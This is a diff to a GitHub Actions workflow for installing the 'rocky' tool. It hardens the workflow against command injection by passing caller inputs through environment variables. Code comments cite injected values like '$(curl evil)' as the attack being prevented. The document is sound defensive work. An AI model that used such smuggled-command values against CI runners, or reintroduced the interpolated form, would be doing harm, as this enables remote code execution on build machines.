@@ -81,26 +81,35 @@ runs:
     # verify the SHA256 against the published checksums.txt — no caching is
     # added because the scripts are fast (≈3-5s) and caching adds a failure
     # mode (stale binary, key churn) that doesn't pay for itself yet.
+    # `inputs.rocky_version` is routed through an `env:` block rather than
+    # interpolated directly into the `run:` body — interpolation would
+    # allow a caller workflow to pass `rocky_version: $(curl evil)` and
+    # achieve RCE on the runner. The env-var form quotes the value as a
+    # shell parameter, not as script text.
     - name: Install rocky (Linux/macOS)
       if: runner.os != 'Windows'
       shell: bash
+      env:
+        ROCKY_VERSION_INPUT: ${{ inputs.rocky_version }}
       run: |
         set -euo pipefail
         export ROCKY_INSTALL_DIR="$HOME/.local/bin"
         mkdir -p "$ROCKY_INSTALL_DIR"
-        if [ "${{ inputs.rocky_version }}" = "latest" ]; then
+        if [ "$ROCKY_VERSION_INPUT" = "latest" ]; then
           curl -fsSL https://raw.githubusercontent.com/rocky-data/rocky/main/engine/install.sh | bash
         else
-          curl -fsSL https://raw.githubusercontent.com/rocky-data/rocky/main/engine/install.sh | bash -s -- "${{ inputs.rocky_version }}"
+          curl -fsSL https://raw.githubusercontent.com/rocky-data/rocky/main/engine/install.sh | bash -s -- "$ROCKY_VERSION_INPUT"
         fi
         echo "$ROCKY_INSTALL_DIR" >> "$GITHUB_PATH"
 
     - name: Install rocky (Windows)
       if: runner.os == 'Windows'
       shell: pwsh
+      env:
+        ROCKY_VERSION_INPUT: ${{ inputs.rocky_version }}
       run: |
-        if ('${{ inputs.rocky_version }}' -ne 'latest') {
-          $env:ROCKY_VERSION = '${{ inputs.rocky_version }}'
+        if ($env:ROCKY_VERSION_INPUT -ne 'latest') {
+          $env:ROCKY_VERSION = $env:ROCKY_VERSION_INPUT
         }
         irm https://raw.githubusercontent.com/rocky-data/rocky/main/engine/install.ps1 | iex
         Add-Content -Path $env:GITHUB_PATH -Value "$env:LOCALAPPDATA\rocky\bin"
@@ -120,12 +129,18 @@ runs:
       id: run-preview
       shell: bash
       env:
+        # All caller-controlled inputs are routed via env: so the
+        # script body never interpolates them directly. The previous
+        # `cd "${{ inputs.working_directory }}"` form would allow a
+        # caller passing `working_directory: $(curl evil)` to execute
+        # arbitrary code; the env-var form quotes as a shell parameter.
         ROCKY_PREVIEW_BASE_REF: ${{ inputs.base_ref }}
         ROCKY_PREVIEW_BRANCH_RAW: ${{ inputs.branch_name }}
         ROCKY_PREVIEW_MODELS_DIR: ${{ inputs.models_dir }}
+        ROCKY_PREVIEW_WORKING_DIR: ${{ inputs.working_directory }}
       run: |
         set -euo pipefail
-        cd "${{ inputs.working_directory }}"
+        cd "$ROCKY_PREVIEW_WORKING_DIR"
 
         # Resolve the branch name. If the caller passed one, slug it for
         # warehouse-schema safety (only [A-Za-z0-9_-]). Otherwise default
